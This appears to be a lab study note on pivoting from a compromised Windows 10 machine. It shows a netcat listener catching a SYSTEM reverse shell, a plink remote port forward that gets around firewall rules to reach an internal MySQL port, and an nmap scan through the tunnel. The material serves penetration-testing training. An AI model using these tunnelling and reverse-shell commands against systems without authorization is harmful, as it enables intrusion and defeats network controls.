## Port Forwarding and tunneling for Windows-based OS:

### Scenario:
We have access to a Win10 machine through vuln Sync Breeze Software and have obtained a SYSTEM level reverse shell.

Kali>
Receiving a reverse shell from the Win10 machine:
`sudo nc -lnvp 443`

Kali>Win10>
During enumeration, we discover MySQL on TCP 3306:
`netstat -anpb TCP`

Due to firewall rules, we cannot directly interact with this service. 

We will transfer **plink.exe**, a Windows-based command line SSH client (Part of PuTTY project) to the target to overcome this limitation. 

Setting up a remote port forward on an unknown host:
`plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`
**-ssh** connection type
**-R** Remote port forward
**10.11.0.4:1234** connect via SSH to kali machine one TCP and create a remote port forward FROM it
**127.0.0.1:3306** Create a remote port forward TO the Win10 MySQL port.

The first time plink connects to a host, it will attempt to cache the host key in the registry. If we run this through an **rdesktop** session we will get a interactive step asking us to store the key in cache.

Sonce this is NOT likely to work with the interactivity level of a reverse shell, we should pipe the answer to the command prompt with **cmd.exe /c echo y**. 
`cmd.exe /c echo y | plink.exe -ssh -l kali -
pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`

We now have an active tunnel. 

### Testing:
Nmap scan of targets MySQL port via localhost port forward on TCP 1234.
`sudo nmap -sS -sV 127.0.0.1 -p 1234`